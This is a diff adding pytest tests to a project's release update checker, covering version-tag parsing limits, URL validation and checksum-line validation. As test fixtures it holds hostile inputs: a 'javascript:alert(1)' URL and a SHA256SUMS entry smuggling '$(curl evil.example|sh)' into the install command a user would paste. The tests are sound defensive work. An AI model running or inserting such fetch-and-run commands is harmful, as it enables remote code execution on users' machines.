@@ -124,6 +124,33 @@ def test_a_tag_with_a_suffix_or_a_draft_does_not_count(tmp_path):
     assert stamp(tmp_path / "none") == {"checked": 1.0, "version": "0.2.0", "latest": None, "line": None, "url": None}
 
 
+def test_only_ascii_digits_of_a_bounded_length_count(tmp_path):
+    for i, tag in enumerate(("v\u0669.\u0669", "v\uff19.\uff19", "v" + "9" * 5000, "v0." + "9" * 10, "v" + ".1" * 11)):
+        home = tmp_path / str(i)
+        assert U.check(home, "0.2.0", opener=web(release(tag), release("v0.2.0")), now=1.0) is None, tag[:12]
+        assert stamp(home)["latest"] == "0.2.0", tag[:12]   # answered and kept: not asked again at every start
+    assert U.parse("9" * 9) == (999999999,) and U.parse("1" + ".1" * 9) is not None
+
+
+def test_a_parse_error_is_a_failure_with_its_stamp(tmp_path, monkeypatch):
+    def broken(version):
+        raise ValueError("Exceeds the limit (4300 digits) for integer string conversion")
+    monkeypatch.setattr(U, "parse", broken)
+    assert U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0")), now=1.0) is None
+    assert stamp(tmp_path)["error"] == ("the releases' answer: ValueError: Exceeds the limit (4300 digits) for "
+                                        "integer string conversion")
+
+
+def test_the_release_page_is_always_githubs_tag_page(tmp_path):
+    for i, page in enumerate(("https://evil.example/v0.2.0", "http://github.com/x", "javascript:alert(1)", None)):
+        r = {**release("v0.2.0"), "html_url": page}
+        got = U.check(tmp_path / str(i), "0.1.0", opener=web(r), now=1.0)
+        assert got["url"] == "https://github.com/neb882/song-charting/releases/tag/v0.2.0", page
+    path = tmp_path / "0" / "state" / "update.json"
+    path.write_text(json.dumps({**got, "url": "https://evil.example/v0.2.0"}), encoding="utf-8")   # nor a stamp's
+    assert U.check(tmp_path / "0", "0.1.0", opener=web(release("v0.2.0")), now=2.0)["url"] == got["url"]
+
+
 def test_the_newest_is_the_highest_version_wherever_it_is_listed(tmp_path):
     w = web(release("v0.9.0"), release("v0.10.0"), release("v0.2.0"))
     assert U.check(tmp_path, "0.9", opener=w, now=1.0)["latest"] == "0.10.0"
@@ -135,7 +162,13 @@ def test_without_a_readable_sha256sums_only_the_release_page(tmp_path):
              "a 404": web(release("v0.2.0"), extra={sums_url("v0.2.0"): None}),
              "cut off": web(release("v0.2.0"), extra={sums_url("v0.2.0"): urllib.error.URLError("reset")}),
              "no install.sh line": web(release("v0.2.0"), extra={sums_url("v0.2.0"): f"{OTHER}  x.tar.gz\n".encode()}),
-             "not a SHA-256": web(release("v0.2.0"), extra={sums_url("v0.2.0"): b"0123  install.sh\n"})}
+             "not a SHA-256": web(release("v0.2.0"), extra={sums_url("v0.2.0"): b"0123  install.sh\n"}),
+             # 64 characters, but not hex: what a hostile SHA256SUMS would put into the line the friend pastes
+             "a command": web(release("v0.2.0"), extra={sums_url("v0.2.0"): b'$(curl evil.example|sh);"`x` ' +
+                                                        b"a" * 35 + b"  install.sh\n"}),
+             "upper case": web(release("v0.2.0"), extra={sums_url("v0.2.0"): SHA.upper().encode() + b"  install.sh\n"}),
+             "too long": web(release("v0.2.0"), extra={sums_url("v0.2.0"): sums("0.2.0") + b" " * U.MAX_SUMS})}
+    assert len(b'$(curl evil.example|sh);"`x` ' + b"a" * 35) == 64
     for name, w in cases.items():
         home = tmp_path / name.replace(" ", "-")
         got = U.check(home, "0.1.0", opener=w, now=1.0)
@@ -191,6 +224,9 @@ def test_any_failure_gives_none_and_waits_an_hour(tmp_path):
     w = web(release("v0.2.0"))
     assert U.check(tmp_path / "offline", "0.1.0", opener=w, now=100.0 + U.RETRY_AFTER_S)["latest"] == "0.2.0"
     assert w.urls == [API, sums_url("v0.2.0")]
+    U.check(tmp_path / "skew", "0.1.0", opener=Web({API: TimeoutError("timed out")}), now=5000.0)
+    assert U.check(tmp_path / "skew", "0.1.0", opener=web(release("v0.2.0")), now=10.0)["latest"] == "0.2.0"   # a
+    # failure dated in the future (the clock moved back, as WSL's can after a sleep) does not block the check
 
 
 def test_offline_never_asks(tmp_path, monkeypatch):
